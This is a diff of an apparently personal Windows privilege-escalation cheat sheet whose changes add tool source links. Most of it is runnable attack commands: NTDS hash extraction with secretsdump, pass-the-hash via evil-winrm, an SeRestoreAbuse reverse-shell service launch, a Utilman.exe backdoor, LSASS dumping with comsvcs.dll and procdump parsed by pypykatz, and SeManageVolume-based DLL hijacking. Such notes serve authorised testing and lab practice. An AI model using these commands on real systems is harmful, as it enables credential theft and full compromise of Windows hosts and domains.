@@ -37,7 +37,7 @@ impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
 evil-winrm -i <DCIP> -u Administrator -H <Hash>
 
 ## SeRestorePrivilege
-I can write any file. SeRestoreAbuse.exe, from my upload/ folder, points a SYSTEM service at a command and starts it:
+I can write any file. SeRestoreAbuse.exe, built from https://github.com/xct/SeRestoreAbuse, which publishes no binary, and fetched from my upload/ folder, points a SYSTEM service at a command and starts it:
 cd C:\Users\Public
 .\SeRestoreAbuse.exe "C:\Users\Public\rev.exe"
 - [ ] rev.exe made with msfvenom -f exe-service, as in :Pb services, since it runs as a service, and a listener up
@@ -53,14 +53,14 @@ copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
 ## SeDebugPrivilege
 LSASS's memory, from PowerShell, which turns the privilege on:
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
-Or with procdump from Sysinternals:
+Or with procdump from Sysinternals, https://learn.microsoft.com/sysinternals/downloads/procdump, in my upload/ folder:
 .\procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp
 - [ ] lsass.dmp sent back into loot/: Defender often deletes it first
 On Kali, after tool install pypykatz at the pwn-broker prompt:
 pypykatz lsa minidump lsass.dmp
 
 ## SeManageVolumePrivilege
-SeManageVolumeExploit.exe, from my upload/ folder, gives Users write on the whole of C:
+SeManageVolumeExploit.exe, from https://github.com/CsEnox/SeManageVolumeExploit/releases and fetched from my upload/ folder, gives Users write on the whole of C:
 .\SeManageVolumeExploit.exe
 icacls C:\Windows\System32\wbem
 A DLL that systeminfo loads, made on Kali and fetched to C:\Users\Public:
